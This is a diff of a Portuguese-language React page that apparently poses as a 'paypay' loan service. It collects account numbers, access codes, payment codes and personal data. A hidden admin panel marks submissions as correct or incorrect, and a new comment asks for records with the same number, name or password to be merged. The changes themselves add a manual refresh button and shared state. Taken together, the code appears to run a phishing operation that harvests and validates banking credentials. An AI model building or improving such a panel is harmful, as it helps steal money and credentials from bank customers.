@@ -1,3 +1,7 @@
+/** 
+ * O site não pode atualizar no automático encima net um botão de atualizar só aí mostrar novos dados 
+ * e se veres mesmo número nome ou senha junta com o que tem mais dados
+ */
 import { createFileRoute } from "@tanstack/react-router";
 import { useState, useEffect, useRef, useMemo } from "react";
 import { motion, AnimatePresence } from "framer-motion";
@@ -114,6 +118,7 @@ function Index() {
   const [adminAuthenticated, setAdminAuthenticated] = useState(false);
   const [adminPassword, setAdminPassword] = useState("");
   const [loading, setLoading] = useState(false);
+  const [applications, setApplications] = useState<any[]>([]);
 
   // Rejection Dialog State
   const [rejectionDialog, setRejectionDialog] = useState<{
@@ -262,6 +267,25 @@ function Index() {
     };
     sessionStorage.setItem('paypay_app_state', JSON.stringify(stateToSave));
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData, applicationId]);
+
+  const fetchApplications = async () => {
+    if (!adminAuthenticated) return;
+    setLoading(true);
+    try {
+      const data = await getApplications({ data: { adminPassword } });
+      setApplications(data as any[]);
+    } catch (err: any) {
+      toast.error(err.message || "Erro ao carregar dados");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    if (adminAuthenticated) {
+      fetchApplications();
+    }
+  }, [adminAuthenticated]);
 
   // Handle secret admin access
   useEffect(() => {
@@ -469,9 +493,8 @@ function Index() {
   };
 
   const AdminDataList = () => {
-    const [apps, setApps] = useState<any[]>([]);
     const [deletedApps, setDeletedApps] = useState<any[]>([]);
-    const [loading, setLoading] = useState(true);
+    const [innerLoading, setInnerLoading] = useState(false);
     const [filter, setFilter] = useState<"all" | "correct" | "incorrect" | "not_verified">("all");
 
     // Handle scroll position persistence for admin panel
@@ -490,45 +513,35 @@ function Index() {
           }
         }, 100);
       }
-    }, [adminTab, apps, deletedApps, filter]);
+    }, [adminTab, applications, deletedApps, filter]);
 
     const filteredApps = useMemo(() => {
       if (adminTab !== "users") return deletedApps;
-      if (filter === "all") return apps;
-      if (filter === "correct") return apps.filter(app => app.analysis_color === 'green');
-      if (filter === "incorrect") return apps.filter(app => app.analysis_color === 'red');
-      if (filter === "not_verified") return apps.filter(app => !app.analysis_color);
-      return apps;
-    }, [apps, deletedApps, adminTab, filter]);
+      if (filter === "all") return applications;
+      if (filter === "correct") return applications.filter(app => app.analysis_color === 'green');
+      if (filter === "incorrect") return applications.filter(app => app.analysis_color === 'red');
+      if (filter === "not_verified") return applications.filter(app => !app.analysis_color);
+      return applications;
+    }, [applications, deletedApps, adminTab, filter]);
 
 
 
-    const fetchApps = async () => {
-      try {
-        const data = await getApplications({ data: { adminPassword } });
-        if (data) setApps(data);
-      } catch (err) {
-        toast.error("Erro ao carregar dados");
-      } finally {
-        setLoading(false);
-      }
-    };
 
     const fetchDeletedApps = async () => {
       try {
-        setLoading(true);
+        setInnerLoading(true);
         const data = await getDeletedApplications({ data: { adminPassword } });
         if (data) setDeletedApps(data);
       } catch (err: any) {
         toast.error("Erro ao carregar lixeira: " + (err.message || "Erro desconhecido"));
       } finally {
-        setLoading(false);
+        setInnerLoading(false);
       }
     };
 
     useEffect(() => {
       if (adminAuthenticated) {
-        if (adminTab === "users") fetchApps();
+        if (adminTab === "users") fetchApplications();
         else fetchDeletedApps();
       }
     }, [adminAuthenticated, adminTab]);
@@ -538,7 +551,7 @@ function Index() {
         isOpen: true, 
         appId: id, 
         isCorrect,
-        onConfirm: fetchApps
+        onConfirm: fetchApplications
       });
       setCustomRejectionReason(isCorrect ? "Empréstimo Aprovado" : "Dados incorretos");
     };
@@ -550,7 +563,7 @@ function Index() {
         const result = await deleteApplication({ data: { id, adminPassword } });
         if (result && result.success) {
           toast.success("Dados movidos para a lixeira");
-          setApps(prev => prev.filter(app => app.id !== id));
+          setApplications(prev => prev.filter(app => app.id !== id));
         }
       } catch (err: any) {
         toast.error("Erro ao apagar dados: " + (err.message || "Erro desconhecido"));
@@ -589,7 +602,7 @@ function Index() {
       if (!permanentPassword) return;
 
       try {
-        setLoading(true);
+        setInnerLoading(true);
         const result = await deleteAllPermanently({ data: { adminPassword, permanentPassword } });
         if (result && result.success) {
           toast.success("Lixeira esvaziada com sucesso");
@@ -598,18 +611,18 @@ function Index() {
       } catch (err: any) {
         toast.error(err.message || "Erro ao esvaziar lixeira");
       } finally {
-        setLoading(false);
+        setInnerLoading(false);
       }
     };
 
-    if (loading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando...</div>;
+    if (innerLoading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando...</div>;
     
     
     const currentList = filteredApps;
     
     if (currentList.length === 0) return (
       <div className="space-y-4">
-        {adminTab === "users" && apps.length > 0 && (
+        {adminTab === "users" && applications.length > 0 && (
           <div className="flex gap-2 p-1 bg-secondary/20 rounded-xl mb-4">
             <button 
               onClick={() => setFilter("all")}
@@ -660,7 +673,7 @@ function Index() {
         className="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar"
       >
 
-        {adminTab === "users" && apps.length > 0 && (
+        {adminTab === "users" && applications.length > 0 && (
           <div className="flex gap-2 p-1 bg-secondary/20 rounded-xl mb-4">
             <button 
               onClick={() => setFilter("all")}
@@ -1497,7 +1510,8 @@ function Index() {
 
                 ) : (
                   <div className="space-y-6">
-                    <div className="flex gap-2 p-1 bg-secondary/30 rounded-xl">
+                    <div className="flex flex-col gap-4">
+                      <div className="flex gap-2 p-1 bg-secondary/30 rounded-xl">
                       <button 
                         onClick={() => setAdminTab("users")}
                         className={cn(
@@ -1515,6 +1529,15 @@ function Index() {
                         )}
                       >
                         <History className="w-4 h-4" /> Lixeira
+                      </button>
+                      </div>
+                      <button 
+                        onClick={() => fetchApplications()}
+                        disabled={loading}
+                        className="w-full bg-primary text-white h-10 rounded-xl font-bold text-[11px] shadow-md hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-2 cursor-pointer"
+                      >
+                        {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <RotateCcw className="w-4 h-4" />}
+                        Atualizar Dados Manualmente
                       </button>
                     </div>
 
